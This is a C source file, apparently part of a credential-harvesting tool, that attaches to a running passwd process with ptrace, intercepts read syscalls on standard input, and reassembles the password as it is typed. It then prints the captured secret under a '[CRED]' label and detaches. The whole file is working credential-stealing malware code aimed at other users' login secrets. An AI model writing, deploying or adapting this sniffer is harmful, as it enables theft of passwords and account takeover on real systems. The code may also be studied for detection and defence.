#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FILE_PASSWD_TRACER 1
#include "config.h"
#include "helpers.h"
#include "tracers.h"

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;

// Check if data looks like password input (printable ASCII)
static int looks_like_password(const char *data, int len) {
  if (len < 1 || len > MAX_PASSWORD_LEN)
    return 0;
  
  // Count printable characters
  int printable = 0;
  for (int i = 0; i < len; i++) {
    unsigned char c = (unsigned char)data[i];
    if (c == '\n' || c == '\0') {
      // Reached end, check if we have enough printable chars
      return printable >= 3;  // At least 3 printable chars before newline
    }
    if (c >= 32 && c <= 126) {
      printable++;
    } else if (c != '\n' && c != '\0') {
      // Non-printable character in the middle (except newline/null)
      return 0;  // Probably not password
    }
  }
  
  // If we got here without hitting newline, check printable count
  return printable >= 3;
}

void intercept_passwd(pid_t traced_process)
{
  int status = 0;
  int syscall = 0;
  int fd = 0;
  int pwd_index = 0;  // Index for accumulating password characters
  long read_length = 0;
  long length = 0;
  char *read_string = NULL;
  char *password = NULL;
  struct user_regs_struct regs;

  password = (char *) calloc(sizeof(char) * MAX_PASSWORD_LEN + 1, 1);

  if (!password)
    goto exit_passwd;

  memset(&regs, 0, sizeof(regs));
  
  // Try to attach with retry logic - process may take a moment to be ready
  int attach_attempts = 0;
  int max_attempts = 5;
  while (attach_attempts < max_attempts) {
    ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
    waitpid(traced_process, &status, 0);
    
    if (WIFSTOPPED(status)) {
      // Successful attach
      break;
    }
    
    attach_attempts++;
    if (attach_attempts < max_attempts) {
      usleep(50000);  // Sleep 50ms before retry
    }
  }

  if (!WIFSTOPPED(status)) {
    debug("[PASSWD] ptrace attach failed after %d attempts\n", attach_attempts);
    goto exit_passwd;
  }
  
  debug("[PASSWD] ptrace attach succeeded after %d attempts\n", attach_attempts);
  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while (1) {
    if (wait_for_syscall(traced_process) != 0)
      break;
    syscall = get_syscall(traced_process);
    if (syscall == SYSCALL_read)
    {
      fd = get_syscall_arg(traced_process, 0);
      read_length = get_syscall_arg(traced_process, 2);
      length = get_reg(traced_process, eax);

      debug("[PASSWD] SYSCALL_read: fd=%d, read_length=%ld, returned=%ld\n", fd, read_length, length);

      // passwd reads password from stdin ONLY (fd=0)
      // Single-character reads are typical for security
      if (fd == 0 && length > 0 && length < 4096) {
        read_string = extract_read_string(traced_process, length);

        if (read_string) {
          // Handle single-character reads (password input for security)
          if (length == 1) {
            unsigned char c = (unsigned char)read_string[0];
            
            // Accumulate printable characters
            if (c >= 32 && c <= 126) {
              if (pwd_index < MAX_PASSWORD_LEN - 1) {
                password[pwd_index++] = c;
                debug("[PASSWD] Accumulated char (index=%d)\n", pwd_index);
              }
            } else if (c == '\n' || c == '\0' || c == '\r') {
              // End of password input
              if (pwd_index > 0) {
                password[pwd_index] = '\0';
                debug("[CRED] Captured from fd=0 (accumulated len=%d): %s\n", pwd_index, password);
                output("%s\n", password);
                
                // Detach after capturing complete password
                ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
                free(read_string);
                goto exit_passwd;
              }
            }
            // Otherwise it's a backspace or other control character, skip it
          } else {
            // Multi-character read on stdin - capture directly
            int j = 0;
            for (j = 0; j < length && j < MAX_PASSWORD_LEN; j++) {
              if (read_string[j] == '\n' || read_string[j] == '\0' || read_string[j] == '\r') {
                break;
              }
              password[j] = read_string[j];
            }

            if (j > 0) {
              password[j] = '\0';
              debug("[CRED] Captured from fd=0 (bulk len=%d): %s\n", j, password);
              output("%s\n", password);
              memset(password, 0, MAX_PASSWORD_LEN);
              pwd_index = 0;
              
              // Detach after capturing password
              ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
              free(read_string);
              goto exit_passwd;
            }
          }

          free(read_string);
          read_string = NULL;
        }
      }
    }
  }


exit_passwd:
  if (password)
    free(password);
  free_process_name();
  free_process_username();
  free_process_path();
  exit(0);
}
